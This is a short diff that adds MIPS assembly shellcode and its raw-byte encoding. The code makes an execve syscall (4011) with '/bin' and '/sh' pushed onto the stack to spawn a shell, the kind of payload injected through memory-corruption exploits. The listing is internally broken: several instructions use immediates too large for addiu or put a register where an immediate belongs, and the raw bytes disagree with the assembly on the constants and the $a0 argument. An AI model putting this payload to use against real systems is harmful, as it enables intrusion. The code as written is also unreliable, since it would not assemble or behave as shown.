@@ -1,0 +1,14 @@
+addiu $v0, $zero, 4011
+addiu $t0, $zero, 0x8
+subu $sp, $sp, $t0
+addiu $t0, $zero, 0x6e69622f
+sw $t0, 0($sp)
+addiu $t0, $zero, 0x0068732f
+sw $t0, 4($sp)
+addiu $a0, $zero, $sp
+addiu $a1, $zero, $zero
+addiu $a2, $zero, $zero
+syscall
+
+;Raw bytes;
+;\x24\x02\x0f\xab\x24\x08\x00\x08\x03\xa8\xe8\x23\x24\x08\x62\x2f\xaf\xa8\x00\x00\x24\x08\x73\x2f\xaf\xa8\x00\x04\x24\x04\x00\x00\x24\x05\x00\x00\x24\x06\x00\x00\x00\x00\x00\x0c
